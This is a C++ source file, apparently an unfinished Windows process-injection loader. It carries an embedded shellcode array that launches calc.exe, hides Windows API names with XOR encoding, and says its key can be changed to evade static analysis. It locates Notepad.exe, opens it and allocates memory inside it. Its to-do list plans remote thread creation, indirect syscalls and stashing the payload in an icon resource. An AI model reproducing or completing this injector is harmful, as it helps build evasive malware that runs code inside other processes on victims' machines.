#include <windows.h>
#define TH32CS_SNAPPROCESS 0x00000002 //Used by CreateToolhelp32Snapshot.
#include <stdlib.h>
#include <stdio.h>
#define FAVICON_ICO 
#include <iostream>
//ico for shellcode

/*
To Do
			Immediately required for base functionality
	
	[X] Get PROCESSENTRY, and Process32First to work properly. I am guessing its PROCESSENTRY struct causing issues.
			Solved, by changing the Macro code from 0x00000010 to 0x00000002... That was it. I was providing the incorrect macro.
	[X] Iterate over Snapshot using Process32First/Next, and find a desired process PID by strcmping a provided proc name.
	[ON HOLD] Process name should be XOR'd array.
	[] ProcHandle to the target process.
	[?] VirtualAllocEx
	[?] WriteProcssMemory (write to remote buffer)
	[?]CreateRemoteThread
	[] Implement indirect syscall to CreateRemoteThread

			
			Bugs
	[] CreateToolhelp32Snapshot doesnt seem to work with GetProcAddress when provided in any way other than a string literal??
	[] Notepad.exe is deXOR'd into notepad.bfl. This obviously is preventing implementation of XOR functionality into the strcmpiA function.

			Later 
[] Base64 encode/decode
[] Put shellcode into FAVICON_ICO .ico file, so payload is in the .rsrc section.
*/


unsigned char shellcode[] = { //Payload we want to execute.
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00 
};
size_t shellcode_length = sizeof(shellcode);


//XOR encoded uchar arrays that contain the names of each function we are passing to GetProcAddress, for our indirect syscall method
unsigned char kernel[] = { 0x8, 0xb, 0x14, 0x24, 0x10, 0x25, 0x52, 0x54, 0x6a, 0x34, 0x14, 0x28 }; //kernel32.dll is not a funct, but we need to specify a module for GetProcAddress, kernel32.dll is the relevant module of all below XOR'd functions.
unsigned char virAlloc[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x27, 0x28, 0x3c, 0x17, 0x27 };
unsigned char virProtec[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x36, 0x36, 0x3f, 0xc, 0x21, 0xd, 0x32 };
unsigned char rtlMoveMem[] = { 0x11, 0x1a, 0xa, 0x7, 0x1a, 0x3f, 0x4, 0x2b, 0x21, 0x3d, 0x17, 0x36, 0x17 };
unsigned char CreateToolhelp32SnapshotFlags[] = { 0x17, 0x26, 0x55, 0x78, 0x36, 0x1a, 0x3e, 0x35, 0xa, 0x11, 0x28, 0x14, 0x3c, 0x9, 0x37, 0x1, 0x0, 0x3b };
unsigned char Process32First[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x16, 0x11, 0x36, 0x1d, 0x32 };
unsigned char CreateToolhelp32SnapshotStr[] = { 0x0, 0x1c, 0x3, 0x2b, 0x1, 0x2c, 0x35, 0x9, 0x2b, 0x3c, 0x10, 0x21, 0x2, 0x36, 0x47, 0x76, 0x0, 0x6, 0xb, 0x26, 0x38, 0x2c, 0x1f, 0x15 };
unsigned char Process32Next[] = { 0x13, 0x1c, 0x9, 0x29, 0x10, 0x3a, 0x12, 0x55, 0x76, 0x1e, 0x1d, 0x3c, 0x1a };
unsigned char CreateRemoteThreadStr[] = { 0x0, 0x1c, 0x3, 0x2b, 0x1, 0x2c, 0x33, 0x3, 0x29, 0x3f, 0xc, 0x21, 0x3a, 0x2e, 0x6, 0x21, 0x32, 0xc};
unsigned char targetProcess[] = { 0xd, 0x1, 0x12, 0x2f, 0x5, 0x28, 0x5, 0x48, 0x21, 0x28, 0x1d }; //Notepad.exe XOR'd
unsigned char virtualAllocEx[] = { 0x15, 0x7, 0x14, 0x3e, 0x0, 0x28, 0xd, 0x27, 0x28, 0x3c, 0x17, 0x27, 0x2b, 0x3e }; 
unsigned char writeProcessMemoryStr[] = { 0x14, 0x1c, 0xf, 0x3e, 0x10, 0x19, 0x13, 0x9, 0x27, 0x35, 0xb, 0x37, 0x23, 0x23, 0x19, 0x2b, 0x21, 0x11 };
unsigned char openProcessStr[] = { 0xc, 0x1e, 0x3, 0x24, 0x25, 0x3b, 0xe, 0x5, 0x21, 0x23, 0xb };


unsigned int targetProcessId; //Not XOR'd as its only a predec for a runtime variable.
//WCHAR target[] = "Notepad.exe";
/*
I literally have no clue why but I cannot for the life of me get, GetProcAddress to work with the param CreateToolHelp32Snapshot, unless I provide it as a literal.
I tried doing char[], Nope.
I tried changing my XOR logic, Nope. That was not the issue?
I tried using a plaintext array as parameter, Nope.


To Reiterate:
This issue only happens when CreateToolHelp32Snapshot, is provided in any way other than literal.
I could not replicate this issue with any of the other GetProcAddress calls.....What The Fuck????
Its definitely somehow, my doing.  
*/





//Below struct may be causing problem.
typedef struct PROCESSENTRY32W //I dont want to import TlHelp32.h, so I am going to have to declare this struct myself.
{
	DWORD   dwSize;
	DWORD   cntUsage;
	DWORD   th32ProcessID;          // this process
	ULONG_PTR th32DefaultHeapID;
	DWORD   th32ModuleID;           // associated exe
	DWORD   cntThreads;
	DWORD   th32ParentProcessID;    // this process's parent process
	LONG    pcPriClassBase;         // Base priority of process's threads
	DWORD   dwFlags;
	CHAR    szExeFile[MAX_PATH];    // Path
} PROCESSENTRY32W;


typedef BOOL(WINAPI* functWriteProcessMemory)(
	HANDLE hProcess,
	LPVOID lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T nSize,
	SIZE_T* lpNumberOfBytesWritten
	);


typedef HANDLE(WINAPI* functCreateRemoteProcess)(
	HANDLE hProcess,	//Hanndle for the process, for which the thread will be created in.
	LPSECURITY_ATTRIBUTES lpthreadAtrributes,
	SIZE_T dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID lpParameter,
	DWORD dwCreationFlags,
	LPDWORD lpThreadId
	);


typedef LPVOID(WINAPI* functVirtualAlloc)(//function pointer to VirtualAlloc
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect);


typedef BOOL(WINAPI* functVirtualProtect)( //functin pointer to VirtualProtect
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flNewProtect,
	PDWORD lpflOldProtect);

typedef VOID(WINAPI* functRtlMoveMemory)( //function pointer to RtlMoveMemory
	VOID UNALIGNED* Destination,
	CONST VOID UNALIGNED* Source,
	SIZE_T Length);


typedef HANDLE(WINAPI* functCreateToolHelp32Snapshot)( //function pointer to CreateToolHelp32Snapshot
	DWORD dwFlags,
	DWORD th32ProcessID);

typedef BOOL(WINAPI* functProcess32First)( //function pointer to Process32First
	HANDLE snapshot,
	PROCESSENTRY32W* lpProcessEntry);

typedef BOOL(WINAPI* functProcess32Next)(
	HANDLE snapshot,
	PROCESSENTRY32W* lpProcessEntry); //PROCESSENTRY32& seems to be cast by windows into LPPROCESSENTRY32 (Long pointer)


typedef LPVOID(WINAPI* functVirtualAllocEx)(
	HANDLE hProcess, //Handle to process in which the allocation should occur
	LPVOID lpAddress, //(OPTOINAL, USE NULL IF THIS IS NOT DESIRED) desired starting address for the region of pages that you want to alloc
	SIZE_T dwSize, //size of memory region we want to allocate.
	DWORD flAllocationType, //Type of mem allocatoin. See for valid parameters: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
	DWORD flProtect //Memory protect for our newly allocated region
	);


typedef HANDLE(WINAPI* functOpenProcess)(
	_In_ DWORD dwDesiredAccess,
	_In_ BOOL bInheritHandle,
	_In_ DWORD dwProcessId
);

//CreateRemoteThread 




char XORKey[] = "CnfJuIafDPxDnFtDShjVKDpaqmfsrdRkuoIGfZFhIqUjLomBlNBgNGfvpIuth"; //XOR Key, feel free to change this before each compile to evade static analysis
size_t XORKey_length = sizeof(XORKey);



//Edits provided buffer, by reverse XOR'ing each UCHAR.
unsigned char* XORDecryptLPC(unsigned char *encoded, int sizeOfEncodedStr, char XORKey[], size_t XORKey_length)
{

	for (int it = 0; it < sizeOfEncodedStr; it++)
	{
		encoded[it]= (unsigned char)((encoded[it]) ^ XORKey[(it % XORKey_length)]);
		printf("character %d: %c \n",it, encoded[it]);

	}
	return encoded;

}

//Edits provided buffer, by XOR'ing each UCHAR.
unsigned char* XOREncryptLPC(unsigned char* encoded, int sizeOfEncodedStr, char XORKey[], size_t XORKey_length)
{

	for (int it = 0; it < sizeOfEncodedStr; it++)
	{
		encoded[it] = XORKey[(it % XORKey_length)] ^ (unsigned char)((encoded[it]));


	}
	return encoded;

}



//3) Base64 Encode

//4) Base64 Decode




int main()
{
	bool isAllocated;
	bool isExec;
	//LPVOID pVirtualAlloc;
	void* memoryBuffer;
	functVirtualProtect pVirtualProtect;
	functVirtualAlloc pVirtualAlloc;
	functRtlMoveMemory pRtlMoveMemory;
	functProcess32First pProcess32First;
	functCreateToolHelp32Snapshot pCreateToolHelp32Snapshot;
	functProcess32Next pProcess32Next;
	functCreateRemoteProcess pCreateRemoteProcess;
	functVirtualAllocEx pVirtualAllocEx;
	functWriteProcessMemory pWriteProcessMemory;
	functOpenProcess pOpenProcess;
	HANDLE targetProc;
		pVirtualAlloc = (functVirtualAlloc)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length)); //point our function pointer to starting code of VirtualAlloc
	if (pVirtualAlloc == NULL)
	{
		printf("pVirtualAlloc is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(virAlloc, sizeof(virAlloc), XORKey, XORKey_length); //reencrypt virAlloc string after our handle has been grabbed



	pVirtualProtect = (functVirtualProtect)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length)); //Why are DLL names LPCSTR, and not LPWSTR>?>?>?>?>>??>
	if (pVirtualProtect == NULL)
	{
		printf("pVirtualProtect is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(virProtec, sizeof(virProtec), XORKey, XORKey_length);//reencrypt virProtec string after our handle has been grabbed 

	pRtlMoveMemory = (functRtlMoveMemory)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length));
	if (pRtlMoveMemory == NULL)
	{
		printf("pRtlMoveMemory is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(rtlMoveMem, sizeof(rtlMoveMem), XORKey, XORKey_length);//reencrypt RtlMoveMem string after our handle has been grabbed 


	pProcess32First = (functProcess32First)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(Process32First, sizeof(Process32First), XORKey, XORKey_length));
	if (pProcess32First == NULL)
	{
		printf("pProcess32First is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(Process32First, sizeof(Process32First), XORKey, XORKey_length);//reencrypt Process32First string after our handle has been grabbed 



	pCreateToolHelp32Snapshot = (functCreateToolHelp32Snapshot)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), "CreateToolhelp32Snapshot");
	if (pCreateToolHelp32Snapshot == NULL)
	{
		printf("pCreateToolHelp32Snapshot is null ptr!");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(CreateToolhelp32SnapshotStr, sizeof(CreateToolhelp32SnapshotStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed

	


	pProcess32Next = (functProcess32Next)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)XORDecryptLPC(Process32Next, sizeof(Process32Next), XORKey, XORKey_length));
	if (pProcess32Next == NULL)
	{
		printf("pProcess32Next is null ptr!");

	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(Process32Next, sizeof(Process32Next), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed

	pCreateRemoteProcess = (functCreateRemoteProcess)(GetProcAddress(GetModuleHandle((LPCSTR)(XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length))), (LPCSTR)(XORDecryptLPC(CreateRemoteThreadStr, sizeof(CreateRemoteThreadStr), XORKey, XORKey_length))));
	if (pCreateRemoteProcess == NULL)
	{
		printf("pCreateRemoteProcess IS NULL ptr! \n");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(CreateRemoteThreadStr, sizeof(CreateRemoteThreadStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed

	pVirtualAllocEx = (functVirtualAllocEx)(GetProcAddress(GetModuleHandle((LPCSTR)(XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length))), (LPCSTR)(XORDecryptLPC(virtualAllocEx, sizeof(virtualAllocEx), XORKey, XORKey_length))));
	if (pVirtualAllocEx == NULL)
	{
		printf("pVirtualAllocEx is null ptr \n");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(virtualAllocEx, sizeof(virtualAllocEx), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed

	pWriteProcessMemory = (functWriteProcessMemory)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)(XORDecryptLPC(writeProcessMemoryStr, sizeof(writeProcessMemoryStr), XORKey, XORKey_length)));
	if (pWriteProcessMemory == NULL)
	{
		printf("pWriteProcessMemory IS NULL PTR \n");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(writeProcessMemoryStr, sizeof(writeProcessMemoryStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed

	pOpenProcess = (functOpenProcess)GetProcAddress(GetModuleHandle((LPCSTR)XORDecryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length)), (LPCSTR)(XORDecryptLPC(openProcessStr, sizeof(openProcessStr), XORKey, XORKey_length)));
	if (pOpenProcess == NULL)
	{
		printf("pOpenProcess IS NULL PTR \n");
	}
	XOREncryptLPC(kernel, sizeof(kernel), XORKey, XORKey_length); //reencrypt kernel string after our handle has been grabbed 
	XOREncryptLPC(openProcessStr, sizeof(openProcessStr), XORKey, XORKey_length);//reencrypt CreateToolhelp32SnapshotStr string after our handle has been grabbed





	memoryBuffer = pVirtualAlloc(0, 40096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PROCESSENTRY32W test;
	test.dwSize = sizeof(PROCESSENTRY32W);


	printf("pointer to mem: %p \n", memoryBuffer);

	pRtlMoveMemory(memoryBuffer, shellcode, shellcode_length);

	HANDLE snapshot = pCreateToolHelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == NULL)
	{
		printf("snapshot is null \n");
	}
	else
	{
		printf("err: %d \n", GetLastError());
		printf("snapshot at 0x%p \n", snapshot);
	}



		//testing

	
	BOOL firstProcessIsInBuff = pProcess32First(snapshot,&test);
	if (firstProcessIsInBuff == FALSE)
	{
		printf("firstProcessIsInBuff FAILED \n");
	}

	XORDecryptLPC(targetProcess, sizeof(targetProcess), XORKey, sizeof(XORKey_length));

	

	while (pProcess32Next(snapshot,&test))
	{
		//for (int i = 0; i < sizeof(test.szExeFile); i++)
		{



		//	std::wcout << test.szExeFile[i];
			
		}
		//LPCWSTR fortesting = test.szExeFile;
		std::cout << "PPID" << test.th32ParentProcessID << "\n";
		printf(test.szExeFile);
		if (lstrcmpiA((LPCSTR)test.szExeFile, "Notepad.exe") == 0)
		{
			printf("FOUND A MATCH! FOUND A MATCH FOUND A MATCH FOUND A MATCH");
			targetProcessId = test.th32ProcessID;
			printf(" \n\n %d \n\n", targetProcessId);
			break;
		}
	}
	XOREncryptLPC(targetProcess, sizeof(targetProcess), XORKey, sizeof(XORKey_length));

	if (targetProcessId != 0)
	{
		targetProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)targetProcessId);
		if (targetProc == NULL)
		{
			printf("HANDLE targetProc, initialization via OpenProcess DID NOT WORK! its null \n");
		}
		//2. Iterate over snapshot until next == null. Looking for string match with target process name. Get PID from that.
		//Use PID to get proc handle?
	}
	else
	{
		printf(" \n error: targetProcessId was not instantiated by process enumeration. The target process is likely not running on this machine. \n");
		//could use to loop back to beginning of process enumeration, but use a different XOR'd string to try str matching
	}


	pVirtualAllocEx(targetProc, NULL, 4000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);








	
		printf(" \n\n       le fin. \n");
		return 1;
	}